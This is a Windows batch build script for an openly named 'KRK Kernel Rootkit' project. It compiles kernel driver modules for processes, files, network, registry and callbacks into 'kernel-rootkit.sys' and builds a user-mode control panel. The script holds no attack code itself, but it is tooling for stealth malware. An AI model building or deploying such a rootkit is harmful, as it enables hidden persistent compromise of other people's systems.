@echo off
setlocal enabledelayedexpansion

echo ============================================
echo   KRK Kernel Rootkit - Build System
echo ============================================
echo.

rem Clear CL/LINK env vars so they don't inject extra flags
set "CL="
set "LINK="
set "_CL_="
set "_LINK_="

set VSTOOLS=C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Tools\MSVC\14.29.30133
set WDKROOT=C:\Program Files (x86)\Windows Kits\10
set SDKVER=10.0.19041.0

if not exist "%VSTOOLS%\bin\HostX64\x64\cl.exe" (
    echo [!] VS2019 toolchain not found, trying VS2025...
    set VSTOOLS=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Tools\MSVC\14.44.35207
)

if not exist "!VSTOOLS!\bin\HostX64\x64\cl.exe" (
    echo [X] No compiler found.
    exit /b 1
)

set "CLEXE=!VSTOOLS!\bin\HostX64\x64\cl.exe"
set "LNKEXE=!VSTOOLS!\bin\HostX64\x64\link.exe"
set "MSVC_INC=!VSTOOLS!\include"
set "MSVC_LIB=!VSTOOLS!\lib\x64"
set "KM_INC=%WDKROOT%\Include\%SDKVER%\km"
set "SHARED_INC=%WDKROOT%\Include\%SDKVER%\shared"
set "UCRT_INC=%WDKROOT%\Include\%SDKVER%\ucrt"
set "KM_LIB=%WDKROOT%\Lib\%SDKVER%\km\x64"

set "KM_CFLAGS=/c /nologo /W3 /WX- /O2 /GS- /Gz /TC /D _AMD64_ /D _WIN64 /D NTDDI_VERSION=0x0A000007 /I includes /I "%KM_INC%" /I "%SHARED_INC%" /I "%UCRT_INC%" /I "!MSVC_INC!" /kernel"

echo [*] Compiler: !CLEXE!
echo [*] WDK: %WDKROOT% [%SDKVER%]
echo.

if not exist output mkdir output
if not exist obj mkdir obj

echo [1/3] Compiling kernel driver sources...

set OBJS=
set FAIL=0

for %%f in (kernel\driver\main.c kernel\comm\ioctl.c kernel\core\process.c kernel\core\protect.c kernel\core\file.c kernel\core\net.c kernel\core\reg.c kernel\core\driver.c kernel\core\thread.c kernel\core\callback.c) do (
    set "SRC=%%f"
    for %%n in (%%~nf) do set "OBJNAME=%%n"
    echo       [cc] %%f
    "!CLEXE!" !KM_CFLAGS! /Fo"obj\!OBJNAME!.obj" "%%f"
    if !errorlevel! neq 0 (
        echo [X] Failed to compile %%f
        set FAIL=1
    ) else (
        set "OBJS=!OBJS! obj\!OBJNAME!.obj"
    )
)

if !FAIL! neq 0 (
    echo [X] Compilation FAILED
    exit /b 1
)

echo [2/3] Linking kernel driver...
"!LNKEXE!" /nologo /OUT:"output\kernel-rootkit.sys" /MANIFEST:NO /DRIVER /KERNEL /ENTRY:"DriverEntry" /SUBSYSTEM:NATIVE /MACHINE:X64 /NODEFAULTLIB /LIBPATH:"%KM_LIB%" ntoskrnl.lib hal.lib wmilib.lib !OBJS!
if !errorlevel! neq 0 (
    echo [X] Linking FAILED
    exit /b 1
)

echo [+] kernel-rootkit.sys built successfully!
echo.

echo [3/3] Building control panel...
set "UM_INC=%WDKROOT%\Include\%SDKVER%\um"
set "UM_LIB=%WDKROOT%\Lib\%SDKVER%\um\x64"
set "UCRT_LIB=%WDKROOT%\Lib\%SDKVER%\ucrt\x64"
"!CLEXE!" /nologo /W3 /O2 /TC /D "_CRT_SECURE_NO_WARNINGS" /I "!MSVC_INC!" /I "%UM_INC%" /I "%SHARED_INC%" /I "%UCRT_INC%" /Fe"output\control.exe" usermode\panel\control.c /link /LIBPATH:"!MSVC_LIB!" /LIBPATH:"%UM_LIB%" /LIBPATH:"%UCRT_LIB%" kernel32.lib advapi32.lib user32.lib
if !errorlevel! neq 0 (
    echo [!] Control panel build skipped
) else (
    echo [+] control.exe built successfully!
)

echo.
echo ============================================
echo   Build Complete
echo ============================================
dir output 2>nul
endlocal
